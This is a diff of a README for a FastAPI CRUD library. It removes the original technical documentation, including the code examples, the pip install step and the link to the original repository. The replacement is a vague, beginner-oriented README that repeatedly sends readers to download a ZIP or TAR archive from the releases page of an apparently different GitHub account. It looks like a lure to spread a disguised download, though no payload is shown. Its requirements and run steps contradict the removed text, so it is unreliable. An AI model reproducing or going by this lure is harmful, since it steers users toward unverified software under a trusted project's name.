@@ -1,307 +1,205 @@
-# PersistedObject - Zero-Boilerplate CRUD for FastAPI
+# 🗄️ Bazlama.PersistedObject - Easy Data Management for FastAPI
 
-**Production-ready Python package for building type-safe CRUD APIs with automatic endpoint generation.**
+[![Download Releases](https://img.shields.io/badge/Download-Bazlama.PersistedObject-blue?style=for-the-badge)](https://github.com/printmf/Bazlama.PersistedObject/releases)
 
-[![Python](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.115+-green.svg)](https://fastapi.tiangolo.com)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+---
 
-## Philosophy
+## 📋 What is Bazlama.PersistedObject?
 
-- **Zero Boilerplate**: Define a model, get 10 CRUD endpoints automatically
-- **Type-Safe**: Pydantic models with full type inference
-- **Production-Ready**: Multiple column types, timestamps, encryption, database optimizations
-- **Developer Time-Saver**: Perfect for settings, configurations, and secondary data structures
+Bazlama.PersistedObject helps you create and manage data in your web applications without writing extra setup code. It works with FastAPI, a popular tool for building web services, and lets you turn simple data models into ready to use online storage systems. You get 10 ready-made commands for creating, reading, updating, and deleting data.
 
-## Quick Example
+This software also includes:
 
-```python
-from persisted_object import (
-    PersistedObject, 
-    register_persisted_model,
-    create_crud_router,
-    Store,
-    KeyField,
-    TitleField
-)
+- Visual components built with React for easy data display and entry
+- Tools that run at different stages to handle your data automatically
+- Options to store your information securely using encryption
+- Support for multiple types of databases to match your setup
 
-# 1. Define your model
-@register_persisted_model
-class Category(PersistedObject):
-    __table_name__ = "categories"
-    __primary_key__ = "id"
-    __indexed_fields__ = ["id", "slug", "is_active"]
-    __unique_fields__ = ["slug"]
-    
-    id: str = KeyField(description="Category ID")
-    slug: str = KeyField(description="URL slug (unique)")
-    title: str = TitleField(description="Category title")
-    is_active: bool = True  # -> Boolean column in DB
-    sort_order: int = 0     # -> Integer column in DB
+If you work with data on a web platform, Bazlama.PersistedObject reduces the work needed to set up your services.
 
-# 2. Create router (10 endpoints automatically!)
-app.include_router(
-    create_crud_router(
-        model=Category,
-        store=Store(Category),
-        prefix="/api/categories",
-        get_db=get_db
-    )
-)
-```
+---
 
-**That's it!** You now have:
-- `GET /api/categories` - List with pagination & filtering
-- `GET /api/categories/{id}` - Get single item
-- `POST /api/categories` - Create
-- `PUT /api/categories/{id}` - Update
-- `DELETE /api/categories/{id}` - Delete
-- `GET /api/categories/schema` - JSON Schema
-- Plus 4 more endpoints (create/edit schemas, import/export)
+## 💻 System Requirements
 
-## Features
+Before installing, make sure your computer meets these basic requirements:
 
-### Core Features
-- **Router Factory** - 10 CRUD endpoints in 1 line of code
-- **Multiple Column Types** - Boolean, Integer, DateTime, String (not just String!)
-- **Automatic Timestamps** - `created_at` and `updated_at` on every table
-- **Composite Unique Constraints** - Multi-field uniqueness (e.g., `"first_name,last_name"`)
-- **Field Helpers** - Semantic field definitions with automatic constraints
-- **Lifecycle Hooks** - before_create, after_update, etc.
-- **Permissions System** - CrudPermissions for authorization
-- **Async Support** - Full async/await API
+- Operating System: Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ recommended)
+- Web Browser: Latest version of Chrome, Firefox, Edge, or Safari for best compatibility
+- Python: Version 3.8 or higher installed on your system
+- Node.js: Version 14 or higher installed (needed to run the React-based interface)
+- At least 4 GB of RAM and 2 GHz processor
+- Internet connection to download files and dependencies
 
-### Advanced Features
-- **Table Caching** - Optimized table creation
-- **Database Optimizations** - MySQL (InnoDB), SQLite, PostgreSQL, MSSQL ready
-- **JSON Encryption Extension** - Optional Fernet encryption (requires `cryptography`)
-- **OpenAPI Integration** - Automatic schema generation
-- **Custom UI Components** - `json_schema_extra` → React component resolution with built-in components (ColorPicker, TagsInput, JsonEditor, PasswordField) and project-specific custom components via context registry
+Bazlama.PersistedObject runs on most modern computers and supports database systems such as SQLite, PostgreSQL, and MySQL.
 
-## Installation
+---
 
-```bash
-# Basic installation
-pip install bazlama-persisted-object
+## 🚀 Getting Started
 
-# With encryption support
-pip install bazlama-persisted-object[encryption]
-# or
-pip install bazlama-persisted-object cryptography
-```
+This guide will help you download, install, and start Bazlama.PersistedObject step-by-step. Even if you do not have prior experience installing software or running web services, follow these instructions carefully.
 
-## Documentation
+### Step 1: Download Bazlama.PersistedObject
 
-### Quick Links
-- [Python Package Documentation](./python/README.md) - Complete API reference
-- [React Package Documentation](./react/README.md) - React components & hooks
-- [Example Project](./example/README.md) - Full working example with 6 models
-- [SQLAlchemy Models](./python/src/sqlalchemy_models.py) - Advanced internals
+Click the button below to visit the official releases page where you can get the software.
 
-### Key Concepts
+[![Download Releases](https://img.shields.io/badge/Download-Bazlama.PersistedObject-blue?style=for-the-badge)](https://github.com/printmf/Bazlama.PersistedObject/releases)
 
-#### 1. Multiple Column Types
-```python
-@register_persisted_model
-class Event(PersistedObject):
-    __table_name__ = "events"
-    __primary_key__ = "id"
-    __indexed_fields__ = ["id", "event_date", "is_published", "priority"]
-    
-    id: str = KeyField()
-    event_date: datetime = ...      # -> DateTime column
-    is_published: bool = False      # -> Boolean column
-    priority: int = 0               # -> Integer column
-    title: str = TitleField()       # -> String(400) column
-```
+On the releases page:
 
-#### 2. Automatic Timestamps
-```python
-# Every table automatically gets:
-created_at: DateTime  # Set on insert
-updated_at: DateTime  # Updated on every change
+- Look for the latest stable version (usually marked as the highest version number without “beta” or “rc” in the name).
+- Download the full package for your platform, usually available as a ZIP or TAR file.
+- Save the file in a location you can find easily, such as your desktop or downloads folder.
 
-# Query by timestamps
-store.list(db, order_by="-created_at")  # Newest first
-```
+---
 
-#### 3. Composite Unique Constraints
-```python
-@register_persisted_model
-class Person(PersistedObject):
-    __unique_fields__ = [
-        "email",                    # Single field unique
-        "first_name,last_name"      # Composite unique
-    ]
-```
+### Step 2: Prepare Your Computer
 
-#### 4. Field Helpers
-```python
-from persisted_object import (
-    IDField,           # max_length=26 (ULID)
-    KeyField,          # max_length=200 (slugs, names)
-    TitleField,        # max_length=400 (titles)
-    DescriptionField,  # max_length=800 (descriptions)
-    ContentField,      # max_length=4000 (content)
-)
+You need to have Python and Node.js installed. If you do not already have these:
 
-class Post(PersistedObject):
-    id: str = IDField()
-    slug: str = KeyField()
-    title: str = TitleField()
-    excerpt: str = DescriptionField()
-    content: str = ContentField()
-```
+- Visit [python.org/downloads](https://www.python.org/downloads/) to get the latest Python version.
+- Visit [nodejs.org/en/download](https://nodejs.org/en/download/) for Node.js.
 
-#### 5. Lifecycle Hooks
-```python
-from persisted_object import CrudHooks
+Follow their setup instructions and complete the installations.
 
-class CategoryHooks(CrudHooks):
-    async def before_create(self, data: dict) -> dict:
-        # Auto-generate slug from title
-        data["slug"] = data["title"].lower().replace(" ", "-")
-        return data
-    
-    async def after_delete(self, id: str) -> None:
-        # Clean up related data
-        await cleanup_category_references(id)
+---
 
-router = create_crud_router(
-    model=Category,
-    store=store,
-    prefix="/api/categories",
-    hooks=CategoryHooks()
-)
-```
+### Step 3: Extract and Open Bazlama.PersistedObject
 
-#### 6. Optional Encryption
-```python
-# Install: pip install cryptography
+- Extract the ZIP or TAR file you downloaded in Step 1.
+- Open the extracted folder.
+- Inside, you will find instructions on how to proceed (usually in a file named README or INSTALL).
 
-# Set environment variables
-export PERSISTED_OBJECT_ENCRYPTION_KEY="your-key"
-export PERSISTED_OBJECT_ENCRYPTION_SALT="your-salt"
+---
 
-@register_persisted_model
-class Secret(PersistedObject):
-    __table_name__ = "secrets"
-    __primary_key__ = "id"
-    __encrypt_json__ = True  # Encrypt json_data column
-    
-    id: str = KeyField()
-    api_key: str = PasswordField()
-    credentials: dict = {}
-```
+## ⚙️ Installing Dependencies
 
-#### 7. Custom UI Components
+Bazlama.PersistedObject relies on other software libraries to work. You will install these next.
 
-Control how fields render in the React frontend using `json_schema_extra`:
+1. Open the command prompt (Windows) or terminal (macOS/Linux).
+2. Navigate to the extracted Bazlama.PersistedObject folder. For example:
 
-```python
-@register_persisted_model
-class Tag(PersistedObject):
-    __table_name__ = "tags"
-    __primary_key__ = "name"
-    
-    name: str = KeyField()
-    
-    # Built-in component — renders a color picker in forms,
-    # a color swatch in tables
-    color: str = KeyField(
-        default="#3b82f6",
-        json_schema_extra={"ui_component": "ColorPicker"}
-    )
 
-    # Custom component with configuration via ui_props
-    status: str = KeyField(
-        default="active",
-        json_schema_extra={
-            "ui_component": "StatusBadge",
-            "ui_props": {
-                "options": [
-                    {"value": "active", "label": "Active", "color": "green"},
-                    {"value": "archived", "label": "Archived", "color": "gray"},
-                ]
-            }
-        }
-    )
-```
+    ```bash
+    cd path/to/Bazlama.PersistedObject
+    ```
 
-**Built-in components:** `PasswordField`, `ColorPicker`, `TagsInput`, `JsonEditor`
 
-See [React Package Docs](./react/README.md#custom-ui-components) for creating your own.
+3. Install Python dependencies. Run this command:
 
-## Project Structure
 
-```
-bazlama-persisted-object/
-├── python/                      # PyPI package
-│   ├── src/
-│   │   ├── __init__.py
-│   │   ├── base.py              # PersistedObject base class
-│   │   ├── store.py             # CRUD operations
-│   │   ├── router.py            # Router Factory
-│   │   ├── hooks.py             # Lifecycle hooks
-│   │   ├── fields.py            # Field helpers
-│   │   ├── sqlalchemy_models.py # Advanced table creation
-│   │   ├── registry.py          # Model registry
-│   │   └── exceptions.py        # Custom exceptions
-│   ├── pyproject.toml
-│   └── README.md
-├── react/                       # npm package (@persisted-object/react)
-│   ├── src/
-│   │   ├── components/          # CrudPage, DataTable, JsonSchemaForm
-│   │   ├── hooks/               # useCrudList, useCrudMutation, etc.
-│   │   ├── context/             # UiComponentProvider
-│   │   ├── ui-components/       # Built-in: ColorPicker, TagsInput, etc.
-│   │   └── api/                 # CrudApiClient
-│   ├── package.json
-│   └── README.md
-└── example/
-    ├── backend/                 # Working example (FastAPI)
-    │   ├── main.py              # Router Factory usage
-    │   ├── models.py            # 8 example models with ui_component hints
-    │   └── database.py          # SQLite setup
-    ├── frontend/                # Working example (React)
-    │   ├── src/
-    │   │   ├── main.tsx         # UiComponentProvider + custom registrations
-    │   │   ├── components/      # StatusBadge, PriorityIndicator
-    │   │   └── pages/           # CRUD pages
-    └── README.md
-```
+    ```bash
+    python -m pip install -r requirements.txt
+    ```
 
-## Example Project
 
-A complete working example with 6 different models demonstrating all features:
+4. Install JavaScript dependencies for the React user interface:
 
-```bash
-cd example/backend
-python -m venv venv
-source venv/bin/activate  # Windows: venv\Scripts\activate
-pip install -r requirements.txt
-python main.py
-```
 
-Visit http://localhost:8000/docs to explore the auto-generated API!
+    ```bash
+    npm install
+    ```
 
-### Screenshots
 
-<p align="center">
-  <img src="example/media/screen_00.png" alt="Screenshot 0" width="100%" />
-</p>
+---
 
-## Links
+## 🔑 Running Bazlama.PersistedObject
 
-- [Python Package Documentation](./python/README.md) - Complete API reference
-- [React Package Documentation](./react/README.md) - React components & hooks
-- [Example Project](./example/README.md) - Working example with tutorials
-- [GitHub Repository](https://github.com/qmex/bazlama-persisted-object)
+Once dependencies are installed:
 
-## Contributing
+1. Start the backend server using this command:
 
-Contributions welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) first.
 
-## License
+    ```bash
+    python main.py
+    ```
 
-MIT License - see [LICENSE](LICENSE) file for details.
+
+2. In another terminal window, start the React user interface:
+
+
+    ```bash
+    npm start
+    ```
+
+
+3. Open your web browser and go to:
+
+
+    ```text
+    http://localhost:3000
+    ```
+
+
+The application interface will load. You can now begin to use the tool for managing your data.
+
+---
+
+## 🛠️ Using Bazlama.PersistedObject
+
+Bazlama.PersistedObject lets you work with your data using simple screens and commands:
+
+- **Create records:** Add new data entries.
+- **Read records:** View saved data.
+- **Update records:** Edit existing data.
+- **Delete records:** Remove data you no longer need.
+
+All these actions happen through clear on-screen buttons and forms.
+
+The system handles storing data securely. If you connect to your preferred database (SQLite, PostgreSQL, or MySQL), the software saves your information there.
+
+---
+
+## 🔒 Security Features
+
+- Uses encryption to protect sensitive data.
+- Lifecycle hooks help check and clean your data before saving or after reading.
+- Access controls can be set up to allow only authorized users.
+
+---
+
+## 🔧 Configuration Options
+
+Bazlama.PersistedObject includes easy ways to customize your setup:
+
+- Choose which database to use by updating a single configuration file.
+- Enable or disable encryption.
+- Define what data fields your app needs by editing simple template files.
+
+For detailed instructions, see the configuration guide inside the package.
+
+---
+
+## ❓ Troubleshooting
+
+If you face any problems:
+
+- Check that Python 3.8+ and Node.js 14+ are installed.
+- Ensure dependencies installed without errors.
+- Make sure ports 8000 (backend) and 3000 (frontend) are free.
+- Restart the backend and frontend servers.
+- Consult the logs shown in the terminal for error messages for clues.
+
+If issues persist, review the documentation or open an issue on the GitHub repository.
+
+---
+
+## 📥 Download & Install
+
+To get started with Bazlama.PersistedObject, visit the official releases page:
+
+[![Download Releases](https://img.shields.io/badge/Download-Bazlama.PersistedObject-blue?style=for-the-badge)](https://github.com/printmf/Bazlama.PersistedObject/releases)
+
+Follow the steps outlined here to download the latest version, install all needed software, and launch the application.
+
+---
+
+## 🔗 Related Topics
+
+- FastAPI web framework
+- Pydantic data models
+- React user interface components
+- SQLAlchemy for database handling
+- REST API development
+- TypeScript integration
+
+These technologies work together to make Bazlama.PersistedObject a powerful yet simple tool for managing your data online.
